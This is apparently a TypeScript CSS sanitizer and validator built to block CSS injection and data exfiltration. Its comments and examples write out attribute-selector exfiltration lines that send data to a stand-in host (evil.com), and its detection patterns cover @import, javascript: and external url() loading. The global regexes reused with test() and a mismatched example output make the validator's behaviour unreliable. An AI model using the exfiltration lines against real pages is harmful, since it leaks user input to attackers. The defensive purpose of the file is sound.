/**
 * CSS sanitization utilities for preventing CSS injection attacks.
 *
 * This module provides functions to sanitize custom CSS to prevent:
 * - Data exfiltration via attribute selectors
 * - External stylesheet loading via @import
 * - Script execution via javascript: protocol
 * - External resource loading via url()
 */

/**
 * Regular expressions for detecting dangerous CSS patterns.
 */
const DANGEROUS_PATTERNS = {
  // @import rules that load external stylesheets
  IMPORT_RULE: /@import\s+/gi,

  // Attribute selectors that can be used for data exfiltration
  // e.g., input[value^='a'] { background: url(https://evil.com/a) }
  ATTRIBUTE_SELECTOR: /\[[^\]]*\s*[\^$*|~]?=\s*[^\]]*\]/gi,

  // url() with javascript: protocol
  URL_JAVASCRIPT: /url\s*\(\s*['"]*\s*javascript:/gi,

  // url() with data: protocol (can contain encoded scripts)
  URL_DATA: /url\s*\(\s*['"]*\s*data:/gi,

  // url() with external http/https URLs (for data exfiltration)
  URL_EXTERNAL: /url\s*\(\s*['"]*\s*https?:\/\//gi,

  // CSS expressions (IE-specific, can execute JavaScript)
  CSS_EXPRESSION: /expression\s*\(/gi,

  // -moz-binding (Firefox-specific, can execute JavaScript via XBL)
  MOZ_BINDING: /-moz-binding\s*:/gi,

  // behavior property (IE-specific, can execute scripts via HTC)
  BEHAVIOR: /behavior\s*:/gi,
};

/**
 * Sanitize CSS to prevent injection attacks and data exfiltration.
 *
 * This function removes or neutralizes dangerous CSS patterns including:
 * - @import rules (external stylesheet loading)
 * - Attribute selectors (data exfiltration via CSS selectors)
 * - url() with javascript:, data:, or external http/https URLs
 * - CSS expressions and browser-specific script execution features
 *
 * Safe CSS patterns are preserved:
 * - Standard CSS properties and values
 * - Pseudo-classes (:hover, :focus, etc.)
 * - Pseudo-elements (::before, ::after, etc.)
 * - Class and ID selectors
 * - Type selectors
 * - Combinators (>, +, ~, space)
 * - Color values, gradients (with safe syntax)
 * - Transforms, transitions, animations
 *
 * @param css - The CSS string to sanitize
 * @returns Sanitized CSS safe for insertion into style tags
 *
 * @example
 * ```ts
 * // Safe CSS is preserved
 * sanitizeCss('.hero { color: red; }')
 * // Returns: '.hero { color: red; }'
 *
 * // Dangerous patterns are removed
 * sanitizeCss('@import url("https://evil.com/style.css");')
 * // Returns: ''
 *
 * sanitizeCss('input[value^="a"] { background: url(https://evil.com/a) }')
 * // Returns: 'input { background:  }'
 * ```
 */
export function sanitizeCss(css: string): string {
  if (!css || typeof css !== 'string') {
    return '';
  }

  // Trim whitespace
  let sanitized = css.trim();

  // Remove @import rules completely (prevents external stylesheet loading)
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.IMPORT_RULE, '/* BLOCKED: @import */ ');

  // Remove attribute selectors (prevents data exfiltration)
  // e.g., input[value^='password'] { background: url(https://evil.com/leak) }
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.ATTRIBUTE_SELECTOR, '');

  // Remove url() with javascript: protocol
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.URL_JAVASCRIPT, 'url(/* BLOCKED: javascript */ ');

  // Remove url() with data: protocol (can contain base64-encoded scripts)
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.URL_DATA, 'url(/* BLOCKED: data */ ');

  // Remove url() with external http/https URLs (prevents data exfiltration)
  // This blocks external resource loading that could leak data
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.URL_EXTERNAL, 'url(/* BLOCKED: external */ ');

  // Remove CSS expressions (IE-specific JavaScript execution)
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.CSS_EXPRESSION, '/* BLOCKED: expression */ (');

  // Remove -moz-binding (Firefox XBL JavaScript execution)
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.MOZ_BINDING, '/* BLOCKED: -moz-binding */ :');

  // Remove behavior property (IE HTC script execution)
  sanitized = sanitized.replace(DANGEROUS_PATTERNS.BEHAVIOR, '/* BLOCKED: behavior */ :');

  return sanitized;
}

/**
 * Validate that CSS does not contain any blocked patterns.
 * Returns true if the CSS is safe, false if dangerous patterns are detected.
 *
 * @param css - The CSS string to validate
 * @returns true if safe, false if dangerous patterns detected
 *
 * @example
 * ```ts
 * isValidCss('.hero { color: red; }') // true
 * isValidCss('@import url("evil.css");') // false
 * isValidCss('input[value^="a"] { }') // false
 * ```
 */
export function isValidCss(css: string): boolean {
  if (!css || typeof css !== 'string') {
    return true; // Empty CSS is valid
  }

  // Check for dangerous patterns
  for (const pattern of Object.values(DANGEROUS_PATTERNS)) {
    if (pattern.test(css)) {
      return false;
    }
  }

  return true;
}
